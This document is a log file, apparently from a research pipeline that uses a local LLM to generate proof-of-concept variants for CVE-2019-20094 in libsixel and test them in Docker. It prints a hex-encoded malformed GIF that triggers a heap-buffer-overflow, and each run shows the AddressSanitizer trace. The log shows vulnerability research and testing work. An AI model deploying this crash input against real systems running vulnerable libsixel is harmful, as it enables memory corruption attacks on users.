@@ -1,0 +1,1222 @@
+2026-01-14 12:46:32,672 - INFO - Loaded excel: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/dataset/libsixel_exploited_dataset_for_variant_checking.xlsx
+2026-01-14 12:46:32,672 - INFO - Processing code index CVE-2019-20094
+2026-01-14 12:46:32,672 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:47:13,717 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 12:47:13,718 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P0_org.fig
+2026-01-14 12:47:13,718 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P0.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ada05629e9c at pc 0x00000054eded bp 0x7ffddda27660 sp 0x7ffddda27658
+WRITE of size 1 at 0x7ada05629e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7ada05629e9c is located 0 bytes to the right of 58156700-byte region [0x7ada01eb3800,0x7ada05629e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f5bc0abd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f5bc0abd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ada05629e9c at pc 0x00000054eded bp 0x7ffddda27660 sp 0x7ffddda27658
+WRITE of size 1 at 0x7ada05629e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7ada05629e9c is located 0 bytes to the right of 58156700-byte region [0x7ada01eb3800,0x7ada05629e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f5bc0abd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f5bc0abd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f5bc0abd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f5bc0abd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [1, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ada05629e9c at pc 0x00000054eded bp 0x7ffddda27660 sp 0x7ffddda27658\nWRITE of size 1 at 0x7ada05629e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x7ada05629e9c is located 0 bytes to the right of 58156700-byte region [0x7ada01eb3800,0x7ada05629e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x7ada5ea17c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0f5bc0abd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f5bc0abd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f5bc0abd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f5bc0abd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f5bc0abd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0f5bc0abd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f5bc0abd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f5bc0abd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f5bc0abd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f5bc0abd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f5bc0abd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 12:48:00,025 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:48:26,742 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 12:48:26,743 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P1_org.fig
+2026-01-14 12:48:26,744 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P1.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72b557829e9c at pc 0x00000054eded bp 0x7ffc0df99000 sp 0x7ffc0df98ff8
+WRITE of size 1 at 0x72b557829e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x72b557829e9c is located 0 bytes to the right of 58156700-byte region [0x72b5540b3800,0x72b557829e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e572aefd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e572aefd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72b557829e9c at pc 0x00000054eded bp 0x7ffc0df99000 sp 0x7ffc0df98ff8
+WRITE of size 1 at 0x72b557829e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x72b557829e9c is located 0 bytes to the right of 58156700-byte region [0x72b5540b3800,0x72b557829e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e572aefd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e572aefd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e572aefd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e572aefd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [2, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72b557829e9c at pc 0x00000054eded bp 0x7ffc0df99000 sp 0x7ffc0df98ff8\nWRITE of size 1 at 0x72b557829e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x72b557829e9c is located 0 bytes to the right of 58156700-byte region [0x72b5540b3800,0x72b557829e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x72b5b0c6bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0e572aefd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e572aefd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e572aefd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e572aefd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e572aefd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0e572aefd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e572aefd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e572aefd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e572aefd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e572aefd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e572aefd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 12:49:13,125 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:51:13,228 - ERROR - Error communicating with Ollama API: HTTPConnectionPool(host='localhost', port=23567): Read timed out. (read timeout=120)
+2026-01-14 12:51:13,228 - ERROR - Failed to generate variant 2 for code index CVE-2019-20094
+2026-01-14 12:51:13,228 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:51:38,278 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 12:51:38,279 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P3_org.fig
+2026-01-14 12:51:38,280 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P3.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b140e629e9c at pc 0x00000054eded bp 0x7ffdf31a3500 sp 0x7ffdf31a34f8
+WRITE of size 1 at 0x7b140e629e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7b140e629e9c is located 0 bytes to the right of 58156700-byte region [0x7b140aeb3800,0x7b140e629e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
